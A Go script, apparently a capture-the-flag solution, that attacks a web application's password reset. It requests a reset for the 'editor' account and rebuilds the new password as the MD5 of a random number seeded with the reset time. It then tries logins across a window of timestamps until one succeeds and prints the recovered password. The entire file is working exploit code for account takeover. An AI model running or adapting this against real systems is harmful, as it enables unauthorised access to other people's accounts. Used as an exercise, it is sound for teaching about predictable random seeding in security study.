package main

import (
	"bytes"
	"crypto/md5"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

const HOST = "https://REPLACE-WITH-CHALLENGE-URL"

func rand_to_md5(rand int) string {
	str := fmt.Sprintf("%d\n", rand)
	// fmt.Printf("str: %s", str)
	hex := fmt.Sprintf("%x", md5.Sum([]byte(str)))
	return hex
}

func unix_to_md5(unix int64) string {
	rand.Seed(unix)
	return rand_to_md5(rand.Int())
}

func main() {
	timeOfReset := time.Now().Unix()

	// Send a POST request to /reset with the name of the user you want to reset the password for
	r, err := http.NewRequest("POST", HOST+"/reset", bytes.NewBufferString("name=editor"))
	if err != nil {
		panic(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(r)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	fmt.Printf("resp: %v\n", resp)

	// Get the body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("body: %s\n", body)

	// Wait for the email to be sent
	time.Sleep(10 * time.Second)

	for i := -5; i < 20; i++ {
		// Login as editor
		password := unix_to_md5(timeOfReset + int64(i))
		r, err = http.NewRequest("POST", HOST+"/login", bytes.NewBufferString("name=editor&password="+password))
		if err != nil {
			panic(err)
		}

		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err = client.Do(r)
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()

		fmt.Printf("resp: %v\n", resp)

		// Get the body
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		if strings.Contains(string(body), "Couldn&#39;t find a user with those credentials") {
			fmt.Printf("Couldn't find a user with those credentials\n")
			continue
		}

		fmt.Printf("body: %s\n", body)
		fmt.Printf("password: %s", password)
		break
	}
}